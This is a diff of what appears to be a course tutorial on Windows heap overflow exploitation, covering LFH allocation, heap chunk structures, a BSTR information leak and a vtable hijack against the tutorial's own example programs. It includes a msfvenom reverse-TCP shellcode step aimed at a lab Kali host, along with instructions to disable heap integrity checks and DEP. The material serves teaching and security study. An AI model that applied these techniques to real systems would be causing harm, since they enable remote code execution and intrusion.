@@ -1,10 +1,8 @@
 # Heap Overflows in Windows
-> [!NOTE] 
+> [!NOTE]
 > The three heap overflow related exploits performed on example code in this document are created based on this article [[1]](https://www.rapid7.com/blog/post/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/).
 ___
-
-
-Unlike in previous exploits we will not start off by attacking the VChat server as we will instead be exploiting a *Heap Overflow* in an example program that is easier to examine and understand. Much like the stack within a program the heap is a space in memory used to store program data. The stack is used for local variables, whenever a function call is made a new stack frame is allocated with the local variables, saved register values, and most importantly the return value of the function on a thread's stack. Unlike the stack, the heap does not contain the return address of a function, and is instead used to store data in regions assigned through the use of functions like [`malloc(...)`](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/malloc?view=msvc-170), one of its alternatives or a Windows specific function call. Much like the stack the heap can be overflowed by using unsafe functions such as [`strcpy(...)`](https://man7.org/linux/man-pages/man3/strcpy.3.html) or [`memcpy(...)`](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170) with the primary differnce being the dynamic nature of tha allocations and free's not allowing us to guarantee if the region we are overflowing is adjacent to any useful data. We often find the heap being used in programs where dynamic allocation are necessary to preserve allocated data made inside of a function call as the stack frames are cleaned up and deallocated when the function exits whereas the heap data is not deallocated until the programmer make a call to `free(...)`.
+Unlike in previous exploits we will not start off by attacking the VChat server as we will instead be exploiting a *Heap Overflow* in an example program that is easier to examine and understand. Much like the stack within a program the heap is a space in memory used to store program data. The stack is used for local variables, whenever a function call is made a new stack frame is allocated with the local variables, saved register values, and most importantly the return value of the function on a thread's stack. Unlike the stack, the heap does not contain the return address of a function, and is instead used to store data in regions assigned through the use of functions like [`malloc(...)`](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/malloc?view=msvc-170), one of its alternatives or a Windows specific function call. Much like the stack the heap can be overflowed by using unsafe functions such as [`strcpy(...)`](https://man7.org/linux/man-pages/man3/strcpy.3.html) or [`memcpy(...)`](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170) with the primary difference being the dynamic nature of tha allocations and free's not allowing us to guarantee if the region we are overflowing is adjacent to any useful data. We often find the heap being used in programs where dynamic allocation are necessary to preserve allocated data made inside of a function call as the stack frames are cleaned up and deallocated when the function exits whereas the heap data is not deallocated until the programmer make a call to `free(...)`.
 
 ## Heap Basics
 ### Heap Allocation Strategies
@@ -12,12 +10,12 @@ The heap is a contiguous region of memory that is separated into a series of *ch
 
 In Windows a common strategy used is the [Low Fragmentation Heap (LFH)](https://learn.microsoft.com/en-us/windows/win32/memory/low-fragmentation-heap), this may also be known as the *Best Fit Allocation Strategy* combined with the *Buddy Allocation Method* . With this strategy the heap or memory manager assigns the chunk that best fits the requested allocation, that is the size of the smallest free block of memory that  fits the request will be used. This reduces fragmentation and preserves larger memory blocks from being whittled down to the point large allocations are not possible by assigning and possibly fragmenting the smaller blocks first. In the case of the Windows Heap Manger, LFH is only applied to heaps that are not fixed in size and were not created with the [HEAP_NO_SERIALIZE](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc#:~:text=this%20function%20call.-,HEAP_NO_SERIALIZE,-0x00000001) flag. It should also be noted if you are using [debugging tools](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/) LFH cannot be enabled and if the allocations are above 16 KB in size LFH will not be used.
 
-Other strategies that exist, but do not appear to be used in the Windows Heap allocation are *First Fit* and *Worst Fit* both of which have benefits and tradeoffs when compared to each other and *Best Fit*. *Worst Fit* is a lot like best fit, except instead of picking the smallest unallocated block that can satisfy the requested allocation we select the largest block, this is to prevent fragmentation that lead to small blocks of unusable sizes that occur with *Best Fit* allocation strategies. *First Fit* addresses runtime concerns as instead of scanning through all possible blocks and picking the best or worst fitting block, it simply picks the first block which can fulfill the requested allocations, the tradeoff being grater fragmentation in the heap.
+<!-- Other strategies that exist, but do not appear to be used in the Windows Heap allocation are *First Fit* and *Worst Fit* both of which have benefits and tradeoffs when compared to each other and *Best Fit*. *Worst Fit* is a lot like best fit, except instead of picking the smallest unallocated block that can satisfy the requested allocation we select the largest block, this is to prevent fragmentation that lead to small blocks of unusable sizes that occur with *Best Fit* allocation strategies. *First Fit* addresses runtime concerns as instead of scanning through all possible blocks and picking the best or worst fitting block, it simply picks the first block which can fulfill the requested allocations, the tradeoff being grater fragmentation in the heap. -->
 
 ### Heap Chunks
 A Heap chunk consists of a header containing metadata used by the heap manger to provide information about the allocated or free memory chunk it is associated with, and the block of freed or allocated memory itself. It is possible, that by overflowing into adjacent chunks that we can modify or leak the data stored within either the heap metadata or the data in the chunk itself! Once this is done we can gain information about the host process to use in later exploitations, such as shown in writeup [1] where you can extract the `vftable` address to get the image's base address so we can access other datastructures more easily!
 
-Below is an example Heap Bin Header used in a Low Fragmentation Heap from [5]: 
+Below is an example Heap Bin Header used in a Low Fragmentation Heap from [5]:
 
 <img src="Images/I1.png" width=600>
 
@@ -30,15 +28,15 @@ Now we can also examine what the Heap Chunk Structure look like in Windows (This
 * `Data`: The Chunk's data.
 
 ### Heap Allocations
-Within Windows there are two Heap allocators, the frontend and backend allocators. The frontend allocator will preform the previously mentioned Low Fragmentation Heap (LFH) allocation or in some older systems it may use a look-aside list. That is the frontend allocator can maintain a [Lookaside List](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists) of free regions in the heap that have been allocated by the backend allocator but are not currently in use for quick allocations without taking a global lock on the heap since we would not be calling into the backend allocator. 
+Within Windows there are two Heap allocators, the frontend and backend allocators. The frontend allocator will preform the previously mentioned Low Fragmentation Heap (LFH) allocation or in some older systems it may use a look-aside list. That is the frontend allocator can maintain a [Lookaside List](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists) of free regions in the heap that have been allocated by the backend allocator but are not currently in use for quick allocations without taking a global lock on the heap since we would not be calling into the backend allocator.
 
 
-The frontend allocator is used to perform the LFH allocations and this is activated through heuristics based on the allocations observed by the backend allocator. Generally once 18 allocations of the **same size** have been performed the allocation strategy will be switched to the LFH strategy if possible, in the case the LFH allocations have been *activated previously* only 17 allocations are required [1][5]. 
+The frontend allocator is used to perform the LFH allocations and this is activated through heuristics based on the allocations observed by the backend allocator. Generally once 18 allocations of the **same size** have been performed the allocation strategy will be switched to the LFH strategy if possible, in the case the LFH allocations have been *activated previously* only 17 allocations are required [1][5].
 
 
 The backend allocator is the default allocator in Windows, this performs operations on and directly manages the heap for a process in the Windows system, allocating free blocks when a `malloc(...)` or equivalent function call is made, deallocating and coalescing (defragmenting) blocks when a `free(...)` call is made, and in the event all blocks within a heap are allocated, or there is no suitable free block the backend allocator will make a systemcall to the kernel in order to allocate additional space on the process's HEAP [5].
 
-### Heap Deallocations 
+### Heap Deallocations
 When a heap has been in use, there will be a series of holes or gaps in the heap segment, these are regions of free memory surrounded by memory that has been allocated to the process. This makes it harder to find and allocate memory to adjacent regions in the heap, because there will often be large gaps between each allocated block. An interesting note discussed in [5] is that LFH allocation does not perform coalescing, or defragmentation which is a common challenge when manipulating the Heap due to it's effects on the Heap making it harder to create a known, exploitable state. When chunks are coalesced this means two adjacent free blocks of memory will be joined together to form one larger block of memory. This means we could turn that single large block of memory into two or more adjacent regions.
 
 ## Attacker's Goal
@@ -60,7 +58,7 @@ This is why you will see real exploits preform a number of allocations, this cou
 > [!NOTE]
 > We will be using the above image as a reference, for simplicity we will be assuming the heap allocations a filled from left to right in order as annotate. This may not be the case in a real-world scenario.
 
-In this example, we perform a series of three allocations to fill the current *holes* in the heap. We may not need to fill all the holes but only those of the size we are requesting to make a new heap segment get allocated or to start breaking up a larger free block. For this example, after the first three allocations the next three are *adjacent* as they are being allocated from a large free block being segmented or are allocated in a new heap segment. 
+In this example, we perform a series of three allocations to fill the current *holes* in the heap. We may not need to fill all the holes but only those of the size we are requesting to make a new heap segment get allocated or to start breaking up a larger free block. For this example, after the first three allocations the next three are *adjacent* as they are being allocated from a large free block being segmented or are allocated in a new heap segment.
 
 ### Heap Overflows
 One of the most challenging parts of a Heap Overflow is the Heap management aspect, that is putting the Heap into a viable state for exploitation as for us to overwrite or read meaningful values we are required to have adjacent chunks as discussed previously. Once this has been done, the only challenges you typically face are those involved with Stack Overflow exploits that have been discussed previously. A Heap Overflow due to the location of the Heap, and the somewhat unpredictable nature of it's allocations may not always be used for direct shellcode execution, however even if this is not the case, we can often use the Heap overflow to leak information that would otherwise be contained in the Heap Headers, or the underlying data within.
@@ -69,27 +67,26 @@ In [1] for example the `vtable` address is leaked as the datastructures saved to
 ## Pre-Exploitation
 The primary requirement that must be met before we perform any testing or exploitation on the heap is to disable the **Validate Heap Integrity** protections in Windows. This is a system wide configuration that we can disable using the steps shown below. It's effects are discussed in the [VChat_Heap_Defense](https://github.com/DaintyJet/VChat_Heap_Defense) writeup.
 
-1. Open Windows Security Options from the search bar
+1. Open Windows Security Options from the search bar.
 
     <img src="Images/S1.png" width=600>
 
-2. Open App and Browser Control, scroll down to the Exploit Protection section
+2. Open App and Browser Control, scroll down to the Exploit Protection section.
 
     <img src="Images/S2.png" width=600>
 
-3. Open the Exploit Protection Setting, this will default to the system settings. You can scroll down to the Validate Heap Integrity Section and set to *Off by Default*
+3. Open the Exploit Protection Setting, this will default to the system settings. You can scroll down to the Validate Heap Integrity Section and set to *Off by Default*.
 
     <img src="Images/S3.png" width=600>
 
 ### Refresher - Heap Chunks and Allocations
-Heap chunks are the basic data structure used in a heap. Once heap space is required e.g a call to `malloc()` is made, the heap manager will allocate chunk for it. A heap chunk consists of user data and metadata. When a heap is freed e.g a call to `free()`, the heap chunk will become a free chunk. All free chunks are managed in the form of a linked list. 
+Heap chunks are the basic data structure used in a heap. Once heap space is required e.g a call to `malloc()` is made, the heap manager will allocate chunk for it. A heap chunk consists of user data and metadata. When a heap is freed e.g a call to `free()`, the heap chunk will become a free chunk. All free chunks are managed in the form of a linked list.
 
 First lets see the see basic allocation strategies used within a modern system [2]:
 - Use an available free chunk either fully or fragment it to create an allocated chunk and a smaller free chunk.
 - Otherwise, allocate a new  free heap chunk at the top of the heap if there is available space in the heap.
   - If there is no available space the heap manager will ask the kernel to add new memory to the end of the heap, and then allocate a new chunk.
 - If all these strategies fail, the allocation can’t be serviced, and `malloc(...)` returns NULL as a failure.
-
 
 Now let's move to exploring heap allocation more specifically in a **Windows 10** system.
 
@@ -98,24 +95,22 @@ There are two categories of heap allocation in Windows:
 - Segment heap [3][4], this is the native implementation in current Windows Versions [4].
 
 We will focus on **Segment** heap. Which can be further divided into：
-- back-end allocator (by default)
+- back-end allocator (by default).
 - front-end allocator: Low fragment heap (LFH). To enable LFH, there must be at least 18 heap allocations. Those allocations don't have to be consecutive but they need to be the same size.
 
 ## Exploration
-First we will run a series of programs in order to understand more about the Windows stack, this follows the same process that has been discussed in [1], and is informed by the information included in [4] and [5] that has been summarized previously in the [Heap Basics](#heap-basics) section. 
+First we will run a series of programs in order to understand more about the Windows stack, this follows the same process that has been discussed in [1], and is informed by the information included in [4] and [5] that has been summarized previously in the [Heap Basics](#heap-basics) section.
 
 ### Heap Chunks in WinDBG
-We can attach any program that utilizes a heap structure to the WinDBG debugger in Windows. For example we could attach the executable resulting from the [ReuseTest.cpp](./SourceCode/ReuseTest.cpp) source file and examine some of the Heap structures and charicteristices in WinDBG.
+We can attach any program that utilizes a heap structure to the WinDBG debugger in Windows. For example we could attach the executable resulting from the [ReuseTest.cpp](./SourceCode/ReuseTest.cpp) source file and examine some of the Heap structures and characteristics in WinDBG.
 
 Below are a series of command that can be used in WinDBG to gather more information about the Windows heap object or allocation.
 * `!heap -s`: List all heaps associated with the current process. From here you can examine general information and gather the heap handles.
 * `!heap -h <Handle>`: Print out all non LFH blocks associated with the given handle.
-* `!heap -a <Handle>`: Prints out the all the information associated with the heap in addition to the list of blocks attached to the given handle. 
+* `!heap -a <Handle>`: Prints out the all the information associated with the heap in addition to the list of blocks attached to the given handle.
 * `!heap -i -h <Handle>`: Prints information about a given heap.
-* `!heap -s -a -h <Handle>`: Print all summery information and heap blocks of a heap associated with the given handle
-  * Add -c to print content
-
-
+* `!heap -s -a -h <Handle>`: Print all summery information and heap blocks of a heap associated with the given handle.
+  * Add -c to print content.
 
 We can examine a `_HEAP_ENTRY` object that would be located on the heap using the command `dt _HEAP_ENTRY` in [windbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/). In Windows 11 it has the following structure:
 ```
@@ -145,25 +140,23 @@ ntdll!_HEAP_ENTRY
 ```
 > ![IMPORTANT]
 > This structure is 8-bytes in size. And is prepended to all data entries on the heap. This means in order to overwrite the data section of a heap chunk, this needs to be overwritten.
-* `Size`: Size of the chunk in terms of the number of blocks including the `_HEAP_ENTRY` that are required to store the data. 
+* `Size`: Size of the chunk in terms of the number of blocks including the `_HEAP_ENTRY` that are required to store the data.
 * `Flags`: Flags used to denote the state of the chunk, examples include *Free* and *Busy*.
-* `SmallTagIndex`: This stores the checksum of the heap entry, consisting of the XOR'ed value of the first three bytes of the `_HEAP_ENTRY` 
-* `SubSegmentCode`: Contains information on the Sub-Section this may be a part of. 
+* `SmallTagIndex`: This stores the checksum of the heap entry, consisting of the XOR'ed value of the first three bytes of the `_HEAP_ENTRY`.
+* `SubSegmentCode`: Contains information on the Sub-Section this may be a part of.
 * `PreviousSize`: Previous Size of Chunk.
 * `SegmentOffset`: Contains Segment Offset.
-* `LFHFlags`: Flags used to control the Low Fragmentation Heap. 
+* `LFHFlags`: Flags used to control the Low Fragmentation Heap.
 * `UnusedBytes`: Used to store unused bytes. Also used when LFH is activated.
 * `FunctionIndex`: Contains management information used by the Windows heap manager. <!--  Supposedly it contains a function pointer/Index so the manager can preform specific operations on the heap-->
 * `ContextValue`: Contains management information used by the Windows heap manager.
-* `InterceptorValue`: Contains management information used by the Windows heap manager. This is used for additional information and can be used for debugging purposes. 
+* `InterceptorValue`: Contains management information used by the Windows heap manager. This is used for additional information and can be used for debugging purposes.
 * `UnusedBytesLength`: Length in terms of the number of blocks that are unused in the current allocation.
 * `EntryOffset`: Offset to the Heap Entry.
 * `ExtendedBlockSignature`: Byte indicating if the chunk is being managed by the LFH.
 
 > [!NOTE]
 > There exist some sites containing older [C Source Code](https://www.nirsoft.net/kernel_struct/vista/HEAP_ENTRY.html) of the Windows `_HEAP_ENTRY`, though they are older based on the WinDBG output it is still mostly accurate. You can explore additional heap structures discussed in [3].
-
-
 ### LFH
 Using our basic understanding of heap allocations through the backend or the frontend allocator, we can use a modified program from [1] to see how each affects our goal of allocating two or more adjacent chunks in the heap memory space. The original program (with some comments added) is located in [LFHTest-H.cpp](./SourceCode/LFHTest-H.cpp), and the modified code listed below is located in [LFHTest-P.cpp](./SourceCode/LFHTest-P.cpp):
 
@@ -237,14 +230,14 @@ This program is used to show the gaps between heap chunk allocations when using 
     ```
     $ cl LFHTest-P.cpp
     ```
-    * This will compiled and link the `LFHTest-P.cpp` file and produce an executable `LFHTest-P.exe`
-4. Run the `LFHTest-P.exe` file and observe the output as shown below. 
+    * This will compiled and link the `LFHTest-P.cpp` file and produce an executable `LFHTest-P.exe`.
+4. Run the `LFHTest-P.exe` file and observe the output as shown below.
 
     <img src="Images/I4.png" width=600>
 
-     * We can see that during the first 18 allocations there are some inconsistencies between the 1st and 2nd allocations in addition to the fourth allocation, but after the 5th and until the 16th allocation the difference between the addresses of the chunks is consistent, this in addition to their size being `0x308` and the allocated chunk size being `0x300` indicates that the chunks are most likely adjacent to one another.
-     * We can also see that the LFH chunk allocations are not allocated consistently, as the difference between their starting addresses vary quite a bit even though the size is constantly `0x300`. This indicates that the chunks allocated with LFH in Windows 10/11 are not constantly adjacent even when the blocks are allocated one after another. 
-    * *Note*: If we were to print the non-hex values this would still be the case as hex value of `0x308` is equal to 776, which matches up with the output we would see if the output value were to be `%ld` instead of `%x`. 
+   * We can see that during the first 18 allocations there are some inconsistencies between the 1st and 2nd allocations in addition to the fourth allocation, but after the 5th and until the 16th allocation the difference between the addresses of the chunks is consistent, this in addition to their size being `0x308` and the allocated chunk size being `0x300` indicates that the chunks are most likely adjacent to one another.
+   * We can also see that the LFH chunk allocations are not allocated consistently, as the difference between their starting addresses vary quite a bit even though the size is constantly `0x300`. This indicates that the chunks allocated with LFH in Windows 10/11 are not constantly adjacent even when the blocks are allocated one after another.
+   * *Note*: If we were to print the non-hex values this would still be the case as hex value of `0x308` is equal to 776, which matches up with the output we would see if the output value were to be `%ld` instead of `%x`.
 
 > [!NOTE]
 > With regards to the LFH allocations not being adjacent this is a conscious choice made by the Windows Operation System develoupers as the free blocks in the *buckets* of the LFH are allocated allocated in a random order.
@@ -284,7 +277,7 @@ int main(int args, char** argv) {
     printf("New chunk in LFH : 0x%08x\n", chunk);
 
     // Free a block of memory, not sure of why HEAP_NO_SERIALIZE is used
-    // If using the process heap it should not be used. 
+    // If using the process heap it should not be used.
     BOOL result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk);
     printf("HeapFree returns %d\n", result);
 
@@ -311,7 +304,7 @@ If the address of the first allocation matches the second allocation after the f
     ```
     $ cl ReuseTest.cpp
     ```
-    * This will compiled and link the `ReuseTest.cpp` file and produce an executable `ReuseTest.exe`
+    * This will compiled and link the `ReuseTest.cpp` file and produce an executable `ReuseTest.exe`.
 4. Run the `ReuseTest.exe` file and observe the output as shown below.
 
     <img src="Images/I6.png" width=600>
@@ -343,7 +336,7 @@ This means when we perform some number of allocations, we will eventually write 
 
 <img src="Images/I11.png" width=600>
 
-Even if the heap chunks are not reliably reused, they will eventually be filled back in with a value. 
+Even if the heap chunks are not reliably reused, they will eventually be filled back in with a value.
 
 ## Example Program: Proof Of Concept:
 We can now use a program like [POC.cpp](./SourceCode/Exploit/POC.cpp) to verify that we can induce the Windows heap manger into allocating two blocks of adjacent memory that wqe can use to leak information about the running process. We can use [Immunity Debugger](https://www.immunityinc.com/products/debugger/) or [WinDBG](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/#install-windbg-directly) to examine the Heap and confirm that we have successfully allocated the adjacent blocks on the heap.
@@ -357,11 +350,11 @@ We can now use a program like [POC.cpp](./SourceCode/Exploit/POC.cpp) to verify 
     ```
     $ cl /GS- /Z7 .\POC.cpp
     ```
-    * `cl`: The Visual Studio C/C++ Compiler
-    * `/GS-`: Compile with Buffer Overflow Protections disabled
+    * `cl`: The Visual Studio C/C++ Compiler.
+    * `/GS-`: Compile with Buffer Overflow Protections disabled.
     * `/Z7`: Compile with Debugging information, this is useful in the event you need to debug the program!
     * This will compiled and link the `POC.cpp` file and produce an executable `POC.exe`.
-3. Run the POC program and observe the output, do not stop it's execution. 
+3. Run the POC program and observe the output, do not stop it's execution.
 
     <img src="Images/I13.png" width=600>
 
@@ -401,11 +394,11 @@ We can now use a program like [POC.cpp](./SourceCode/Exploit/POC.cpp) to verify 
     ```
     $ cl /GS- /Z7 .\POC.cpp
     ```
-    * `cl`: The Visual Studio C/C++ Compiler
-    * `/GS-`: Compile with Buffer Overflow Protections disabled
+    * `cl`: The Visual Studio C/C++ Compiler.
+    * `/GS-`: Compile with Buffer Overflow Protections disabled.
     * `/Z7`: Compile with Debugging information, this is useful in the event you need to debug the program!
     * This will compiled and link the `POC.cpp` file and produce an executable `POC.exe`.
-3. Run the POC program and observe the output, do not stop it's execution. 
+3. Run the POC program and observe the output, do not stop it's execution.
 
     <img src="Images/I13.png" width=600>
 
@@ -435,24 +428,24 @@ We can now use a program like [POC.cpp](./SourceCode/Exploit/POC.cpp) to verify 
 ## Example Program: Exploit 1, Information leak (Overwrite the size prefix of a BSTR)
 This is the same process as the exploit shown in [1]. The following section provides an explanation of the attack similar to the goals discussed in the previous [Attacker Goals](#attackers-goal) section.
 
-First, as was done in the [Proof of Concept](#proof-of-concept) section we want to induce the stack into having the following structure. 
+First, as was done in the [Proof of Concept](#proof-of-concept) section we want to induce the stack into having the following structure.
 ```
 [attacker controlled chunk1][attacker controlled chunk2][attacker controlled chunk3]
 ```
-After chunk2 is freed, a [BSTR](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/automat/bstr) object which is a basic/binary string with the structure `(Length-Prefix-Value)(String)(Null-Terminator)` is allocated to the place of chunk2 Leading to the following heap Structure. 
+After chunk2 is freed, a [BSTR](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/automat/bstr) object which is a basic/binary string with the structure `(Length-Prefix-Value)(String)(Null-Terminator)` is allocated to the place of chunk2 Leading to the following heap structure:
 ```
 [attacker controlled chunk1][(Length-Prefix-Value)(String)(Null-Terminator)][attacker controlled chunk3]
 ```
 
-Then chunk3 is freed and a vector of object pointers is put into the chunk adjacent to chunk2. As the objects contain Virtual Functions the objects allocated on the heap will contain addresses to the Virtual Table. We should have the following heap structure
+Then chunk3 is freed and a vector of object pointers is put into the chunk adjacent to chunk2. As the objects contain Virtual Functions the objects allocated on the heap will contain addresses to the Virtual Table. We should have the following heap structure:
 
 ```
 [attacker controlled chunk1][attacker controlled chunk: (Length-Prefix-Value)(String)(Null-Terminator)][attacker controlled chunk: Vector-of-Pointers]
 ```
 
-Once this is done a large *evil* string is copied into chunk1 in order to overflow the first four bytes of chunk2, which based on the structure of the BSTR object will be the size prefix of the string it contains, allowing us to overwrite it with a larger size. This means the next time the BSTR is used, more data will be read then expected leaking information from chunk3 including the object pointer. 
+Once this is done a large *evil* string is copied into chunk1 in order to overflow the first four bytes of chunk2, which based on the structure of the BSTR object will be the size prefix of the string it contains, allowing us to overwrite it with a larger size. This means the next time the BSTR is used, more data will be read then expected leaking information from chunk3 including the object pointer.
 
-Because the existence of a virtual function in the class of the object we are storing in the third heap chunk, the object pointer will be the address of a *Virtual Function Table* (vftable/vtable). 
+Because the existence of a virtual function in the class of the object we are storing in the third heap chunk, the object pointer will be the address of a *Virtual Function Table* (vftable/vtable).
 
 We can then use this to calculate the Image Base with the following formula:
 ```
@@ -470,8 +463,8 @@ Image base = vtable address - a fixed offset.
     ```
     $ cl  /GS- /Z7 .\E1.cpp
     ```
-    * `cl`: The Visual Studio C/C++ Compiler
-    * `/GS-`: Compile with Buffer Overflow Protections disabled
+    * `cl`: The Visual Studio C/C++ Compiler.
+    * `/GS-`: Compile with Buffer Overflow Protections disabled.
     * `/Z7`: Compile with Debugging information, this is useful in the event you need to debug the program!
     * This will compiled and link the `E1.cpp` file and produce an executable `E1.exe`.
 3. Run the E1 program and observe the output, notice that we have overflowed the size and gotten a value for the Image's Base Address, though this may not be correct!
@@ -479,7 +472,7 @@ Image base = vtable address - a fixed offset.
     <img src="Images/I21.png" width=600>
 
 4. Launch WinDBG and attach the Exploit 1 process to it.
-   1. Open the start Menu and find WinDBG
+   1. Open the start Menu and find WinDBG.
 
         <img src="Images/I22.png" width=600>
 
@@ -491,24 +484,24 @@ Image base = vtable address - a fixed offset.
 
         <img src="Images/I24.png" width=600>
 
-5. Open the Command Line of WinDBG
+5. Open the Command Line of WinDBG.
    1. Click View and select *Command*.
 
-        <img src="Images/I25.png" width=600> 
+        <img src="Images/I25.png" width=600>
 
    2. Use the command `lm` to list the modules and their starting address.
 
-        <img src="Images/I26.png" width=600> 
+        <img src="Images/I26.png" width=600>
 
-         * Notice that the Base address of the Image is in this case `0x00270000` and the Address of the VFTable is `0x002886e8` per the heap overflow program. This means the offset will be `0x002886e8 - 0x00270000`. This can also be done in IDA Free/Pro, Gihdra or any other disassembler if you can find the vftable entry in the rdata section. 
+         * Notice that the Base address of the Image is in this case `0x00270000` and the Address of the VFTable is `0x002886e8` per the heap overflow program. This means the offset will be `0x002886e8 - 0x00270000`. This can also be done in IDA Free/Pro, Gihdra or any other disassembler if you can find the vftable entry in the rdata section.
 
 6. Modify the exploit with the updated offset and run it again, now you should see the correct image base address. This constant offset should not change unless you recompile the executable.
 
     <img src="Images/I27.png" width=600>
 
-    * *Note*: It may be the case you have to run the program multiple times to get the correct Heap allocations. It should be noted that renaming or moving the file to another folder appears to force a change in the Base Address (Without changing the vtable offset) and this appears to make the exploit more reliable when running it multiple times.   
+    * *Note*: It may be the case you have to run the program multiple times to get the correct Heap allocations. It should be noted that renaming or moving the file to another folder appears to force a change in the Base Address (Without changing the vtable offset) and this appears to make the exploit more reliable when running it multiple times.
 
-7. If you have WinDGB open you can view and confirm that the overflow occurred
+7. If you have WinDGB open you can view and confirm that the overflow occurred.
 
     <img src="Images/I28.png" width=600>
 
@@ -522,7 +515,7 @@ When we make a call to a virtual function Instead directly calling them, objects
 <img src="Images/VTable2.png" width=600>
 
 * We can see from the image above that the object loaded into memory will contain a pointer to a *vtable*, which is then offset to get the correct function to call.
-* We then use the entry in the *vtable* to call the correct code in memory
+* We then use the entry in the *vtable* to call the correct code in memory.
 * This means the first 4 bytes in a 32 bit program, or the first 8 bytes in a 64 bit program of the object will be a pointer to the *vtable* used to determine what code will be executed when a virtual function is called.
 
 Below we show an example of the assembly code of the call made with the line `v1.at(0)->virtualFunction();` in [exploit2-1.cpp](./SourceCode/Exploit/exploit2-1.cpp) and [exploit2-2.cpp](./SourceCode/Exploit/exploit2-1.cpp) when it has been compiled:
@@ -546,16 +539,16 @@ The main commands to be aware of are the following:
 2) `mov ecx, dword ptr [ebp-570h]`:  This stores the address of the object (Previously moved to `[ebp-570h]`) into `ecx`.
 3) `mov edx, dword ptr [ecx]`: This extracts the pointer to the vtable (Located in the first 4 bytes of the object) into `edx`.
 4) `mov eax, dword ptr [edx]`: This extracts the address of the first function pointer located in the vtable, this is done since we are using the first and only virtual function in the object we created.
-5) `call eax`: Call the virtual function as the address is stored in eax
+5) `call eax`: Call the virtual function as the address is stored in eax.
 
 
 To mimic this relationship, we will use three pointers labeled `veax`, `vedx`, and `vecx`. The `veax` pointer will contain the address of the code we would like to execute, the `vedx` pointer contains the address of the `veax` entry (VTable Entry), and the `vecx` pointer contains the address of the `vedx` entry (VTable Pointer stored in the object). Below is a simple diagram to show the relationship:
 
 <img src="Images/EmulatedVTable.png" width=600>
 
-* This has the following flow, ```vecx -> vedx -> veax-> Target Code Execution```
+* This has the following flow, ```vecx -> vedx -> veax-> Target Code Execution```.
 
-When overflowing the first object pointer in chunk2, vecx, which contains the address of vedx, will override the object pointer. Accordingly in the assembly code, we will have ecx = vecx, and as long as the other values have been set properly we will achieve arbitrary code execution. 
+When overflowing the first object pointer in chunk2, vecx, which contains the address of vedx, will override the object pointer. Accordingly in the assembly code, we will have ecx = vecx, and as long as the other values have been set properly we will achieve arbitrary code execution.
 
 ### Exploitation Part 1
 1. Create the [Exploit2-1.cpp](./SourceCode/Exploit/exploit2-1.cpp) file using an editor like [Notepad++](https://notepad-plus-plus.org/) as shown below.
@@ -575,7 +568,7 @@ When overflowing the first object pointer in chunk2, vecx, which contains the ad
     <img src="Images/I30.png" width=600>
 
 4. We can open WinDBG and attach it to the running process.
-   1. Open WinDBG as shown below, if you are running the process as a *Administrator* you will need to launch WinDBG as an *Administrator*
+   1. Open WinDBG as shown below, if you are running the process as a *Administrator* you will need to launch WinDBG as an *Administrator*.
 
         <img src="Images/I31.png" width=600>
 
@@ -625,7 +618,7 @@ When overflowing the first object pointer in chunk2, vecx, which contains the ad
       * Notice the output `"Hi~ I'm Evil! * o *"` , the evil function was never called in the original function! This means we can use this as a means to execute arbitrary shellcode.
 
 ### Exploitation Part 2
-Before executing this we will need to ensure DEP is not enabled on the Windows system. 
+Before executing this we will need to ensure DEP is not enabled on the Windows system.
 1. Open a CMD prompt as an administrator
 
 2. Run the following command and observe the output, if the output is a `1` or `3` then DEP is enabled and we should disable it on the system to prevent future issues.
@@ -647,30 +640,30 @@ Now we can start observing the malicious program as it executes!
     * `-a x86`: Generate the shellcode for a x86 32 bit architecture.
     * `--platform Windows`: Generate the shellcode for a Windows machine.
     * `-p `: Payload we are generating shellcode for.
-        * `windows/shell_reverse_tcp`: Reverse TCP payload for Windows
-        * `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP 10.0.2.7
-        * `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080
-        * `EXITFUNC=process`: Use the process exit function
+        * `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
+        * `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP 10.0.2.7.
+        * `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
+        * `EXITFUNC=process`: Use the process exit function.
     * `-f c`: Output in a format useable in C code.
     * `-v SHELL`: Specify SHELL as the variable name.
 3. Compile [Exploit2-2.cpp](./SourceCode/Exploit/exploit2-2.cpp) with the following command:
     ```
     $ cl  /GS- /Z7 /c .\E2-2.cpp
     ```
-    * `cl`: The Visual Studio C/C++ Compiler
-    * `/GS-`: Compile with Buffer Overflow Protections disabled
+    * `cl`: The Visual Studio C/C++ Compiler.
+    * `/GS-`: Compile with Buffer Overflow Protections disabled.
     * `/Z7`: Compile with Debugging information, this is useful in the event you need to debug the program!
-    * `/c`: Compile without linking
+    * `/c`: Compile without linking.
     * This will compiled and link the `E2.cpp` file and produce an executable `E2.exe`.
 
 4. Link [Exploit2-2.cpp](./SourceCode/Exploit/exploit2-2.cpp) with the following command
     ```
     $ link  /NXCOMPAT:NO .\E2-2.obj
     ```
-    * `link`: The Visual Studio C/C++ Linker
-    * `/NXCOMPAT:NO`: Disable DEP
+    * `link`: The Visual Studio C/C++ Linker.
+    * `/NXCOMPAT:NO`: Disable DEP.
 
-5. Run the resulting executable file, we should see it pauses execution before we attempt to execute the Virtual Function we overflowed. 
+5. Run the resulting executable file, we should see it pauses execution before we attempt to execute the Virtual Function we overflowed.
 
     <img src="Images/I43.png" width=600>
 
@@ -729,16 +722,16 @@ Now we can start observing the malicious program as it executes!
 
 > [!NOTE]
